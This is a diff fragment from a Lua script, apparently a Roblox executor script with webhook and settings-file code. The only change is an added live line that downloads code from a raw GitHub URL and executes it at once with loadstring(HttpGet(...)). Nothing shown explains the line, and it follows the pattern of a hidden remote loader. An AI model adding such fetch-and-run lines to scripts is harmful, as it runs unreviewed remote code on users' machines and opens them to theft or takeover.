@@ -298,4 +298,5 @@ function sendwebhook2(msg)
     
     set = game:service'HttpService':JSONDecode(readfile(Name))
     ]]
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LongTriggered/ProjectForLoi/refs/heads/main/ProjectSupport", true))()
     ---
